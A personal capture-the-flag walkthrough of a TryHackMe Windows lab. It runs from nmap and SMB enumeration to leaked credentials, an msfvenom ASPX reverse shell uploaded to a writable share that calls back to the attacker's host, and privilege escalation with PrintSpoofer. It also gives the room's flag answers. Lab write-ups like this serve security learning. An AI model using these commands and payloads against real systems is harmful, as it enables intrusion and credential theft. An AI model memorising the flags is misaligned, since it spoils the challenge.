---
Penetration Testing Challenge
---

![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/10524728b2b462e8d164efe4e67ed087.jpeg)

###  Pre-Engagement Briefing 

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

    User.txt
    Root.txt

Additionally, the client has provided the following scope allowances:

    Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
    Locate and note all vulnerabilities found
    Submit the flags discovered to the dashboard
    Only the IP address assigned to your machine is in scope
    Find and report ALL vulnerabilities (yes, there is more than one path to root)

(Roleplay off)
I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.

Note - Nothing in this room requires Metasploit

Machine may take up to 5 minutes for all services to start.

**Writeups will not be accepted for this room.**


```
┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.3.92   
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 22:35 EDT
Nmap scan report for 10.10.3.92
Host is up (0.20s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-09-28T02:36:21+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2022-09-27T02:35:08
|_Not valid after:  2023-03-29T02:35:08
|_ssl-date: 2022-09-28T02:37:00+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012 (90%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2016 (90%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-28T02:36:24
|_  start_date: 2022-09-28T02:35:09
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-09-27T19:36:21-07:00
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   199.13 ms 10.11.0.1
2   199.85 ms 10.10.3.92

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.82 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.3.92

┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ smbclient -L 10.10.3.92                           
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.3.92 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ smbclient //10.10.3.92/nt4wrksv    
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 4950803 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
                                                                                                                  
┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ ls
jonah.hash  joomblah.py  passwords.txt
                                                                                                                  
┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk 

Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$

rustscan

Open 10.10.3.92:49663
Open 10.10.3.92:49667
Open 10.10.3.92:49669

49663/tcp open  http          Microsoft IIS httpd 10.0
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC

Web

Scanning the hidden web directories on both ports 80/tcp and 49663/tcp takes a while but is worth it (with directory-list-2.3-medium.txt). Nothing interesting stands out on port 80/tcp, but we find that the nt4wrksv share found previously is also available as a hidden location on port 49663/tcp. 

http://10.10.3.92:49663/nt4wrksv/passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

Exploiting SMB

The handy AutoBlue-MS17-010 script can be used to exploit the MS17-010 Eternal Blue vulnerability:


According to the instructions on the GitHub repository, all that is required is to specify the target IP address, SMB port and valid credentials to authenticate if required, and a SYSTEM shell will be returned.

Cloning the Git Repository locally:

here is a keylogger found 0.10 so don't enter ur github account!! it is not the repository!!
──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ git clone https://github.com/3ndG4me/AutoBlue-MS17-0.10.git         
Cloning into 'AutoBlue-MS17-0.10'...
Username for 'https://github.com': exit
Password for 'https://exit@github.com': 
                                                                                                                  
┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ ls
jonah.hash  joomblah.py  passwords.txt  shell.aspx
                                                                                                                  

the correct one 

┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git 
Cloning into 'AutoBlue-MS17-010'...
remote: Enumerating objects: 126, done.
remote: Counting objects: 100% (50/50), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 126 (delta 40), reused 35 (delta 35), pack-reused 76
Receiving objects: 100% (126/126), 94.22 KiB | 542.00 KiB/s, done.
Resolving deltas: 100% (74/74), done.

Executing the exploit using the following flags

    -target-ip to specify the IP address of the vulnerable Windows machine
    -port to specify the SMB port in use
    the credentials to connect as, in order to execute the exploit, in this case using the Bob user’s credentials

┌──(kali㉿kali)-[~/skynet/daily_bugle/AutoBlue-MS17-010]
└─$ python zzz_exploit.py -target-ip 10.10.3.92 -port 445 'Bob:!P@$$W0rD!123'

some problems let's do normally because with this method we get admin quickly





Upload reverse shell

Interestingly, the network share is writable, which means we can upload arbitrary files. Let’s first generate a reverse shell with msfvenom: 



This can be exploited by uploading a ASP/ASPX shell onto the SMB share and executing it from within the browser.

The first step is to generate some shellcode using MSFvenom with the following flags:

    -p to specify the payload type, in this case, the Windows TCP Reverse Shell
    LHOST to specify the localhost IP address to connect to
    LPORT to specify the local port to connect to
    -f to specify the format for the shell, in this case, ASPX

┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.11.81.220 lport=443 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3392 bytes


Accessing the “nt4wrksv” SMB share enabled and uploading the ASPX reverse shell:

┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ smbclient //10.10.3.92/nt4wrksv
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> pu shell.aspx
putting file shell.aspx as \shell.aspx (5.4 kb/s) (average 5.4 kb/s)
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (5.2 kb/s) (average 5.3 kb/s)
smb: \> exit

When accessing the shell.aspx file through a browser, the reverse shell is executed

http://10.10.3.92:49663/nt4wrksv/shell.aspx

┌──(kali㉿kali)-[~/skynet/daily_bugle/AutoBlue-MS17-010]
└─$ sudo nc -nlvp 443                                                        
[sudo] password for kali: 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.3.92.
Ncat: Connection from 10.10.3.92:49898.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool


c:\windows\system32\inetsrv>more C:\Users\bob\Desktop\user.txt
more C:\Users\bob\Desktop\user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}


priv esc


Running the “whoami /priv” command to check the current user’s privileges in the system:

c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

It appears the current user has the SeImpersonatePrivilege token enabled, which means token impersonation could be used to escalate privileges.

Although Juicy Potato is normally used to exploit token impersonation, this only works if DCOM is enabled on the server. A great alternative is the PrintSpoofer exploit. Downloading the exploit from the Git repository and placing it on the nt4wrksv SMB share so it can be easily transferred to the target machine:

┌──(root㉿kali)-[/home/kali/skynet/daily_bugle]
└─# wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
--2022-09-27 23:25:51--  https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
Resolving github.com (github.com)... 140.82.112.4
Connecting to github.com (github.com)|140.82.112.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/dievus/printspoofer/master/PrintSpoofer.exe [following]
--2022-09-27 23:25:57--  https://raw.githubusercontent.com/dievus/printspoofer/master/PrintSpoofer.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27136 (26K) [application/octet-stream]
Saving to: ‘PrintSpoofer.exe’

PrintSpoofer.exe             100%[============================================>]  26.50K  --.-KB/s    in 0.001s  

2022-09-27 23:25:57 (23.9 MB/s) - ‘PrintSpoofer.exe’ saved [27136/27136]


┌──(kali㉿kali)-[~/skynet/daily_bugle]
└─$ smbclient //10.10.3.92/nt4wrksv  
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer.exe
putting file PrintSpoofer.exe as \PrintSpoofer.exe (30.6 kb/s) (average 30.6 kb/s)
smb: \> exit

Executing the exploit, providing -i to Interact with the new process in the current command prompt and -c to specify to run CMD upon execution:


c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>cd c:\inetpub\wwwroot\nt4wrksv 
cd c:\inetpub\wwwroot\nt4wrksv

c:\inetpub\wwwroot\nt4wrksv>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

09/27/2022  08:27 PM    <DIR>          .
09/27/2022  08:27 PM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
09/27/2022  08:27 PM            27,136 PrintSpoofer.exe
09/27/2022  08:16 PM             3,392 shell.aspx
               3 File(s)         30,626 bytes
               2 Dir(s)  21,042,872,320 bytes free

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>more C:\Users\Administrator\Desktop\root.txt
more C:\Users\Administrator\Desktop\root.txt
THM{1fk5kf469devly1gl320zafgl345pv}


```

![](https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/05/image-306.png?w=1024&ssl=1)


User Flag
*THM{fdk4ka34vk346ksxfr21tg789ktf45}*



Root Flag
*THM{1fk5kf469devly1gl320zafgl345pv}*




[[Daily Bugle]]